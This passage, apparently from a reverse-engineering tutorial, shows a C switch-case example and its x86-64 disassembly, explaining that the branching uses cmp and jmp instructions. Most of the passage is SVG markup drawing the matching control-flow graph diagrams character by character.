<text text-anchor='middle' x='384' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='404' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='400' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='416' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='432' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='440' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='464' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='480' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='488' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='4' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='552' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='552' y='164' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='552' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='276' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='624' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<h3 id="switch-case">Switch-case</h3>
<p>Branching can also be implemented with switch-case directives in C and some other languages. At lower level, they function similarly to if-else.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">a</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; Compare and jump if equal
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; Compare and jump if equal
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; Default jump to the end
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">jmp</span>     <span class="no">.L4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">.L2:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">.L3:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">.L4:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>See&hellip;just like if-else statements, switch-case statements also use <code>cmp</code> and <code>jmp</code> instructions to create branches in the flow.</p>
<p>Graph diagram for the above disassembly will look something like this</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 696 761"
      >
      <g transform='translate(8,16)'>
<polygon points='48.000000,512.000000 36.000000,506.399994 36.000000,517.599976' fill='currentColor' transform='rotate(90.000000, 40.000000, 512.000000)'></polygon>
<polygon points='256.000000,544.000000 244.000000,538.400024 244.000000,549.599976' fill='currentColor' transform='rotate(90.000000, 248.000000, 544.000000)'></polygon>
<polygon points='432.000000,368.000000 420.000000,362.399994 420.000000,373.600006' fill='currentColor' transform='rotate(90.000000, 424.000000, 368.000000)'></polygon>
<text text-anchor='middle' x='8' y='468' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='8' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='8' y='500' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='16' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='484' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='24' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='484' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='32' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='420' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='40' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='40' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='580' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='48' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='484' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='56' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='484' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='64' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='484' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='72' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='276' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='112' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='292' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='128' y='324' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='136' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='644' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='136' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='740' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='324' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='660' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='152' y='692' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='152' y='724' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='152' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>─</text>
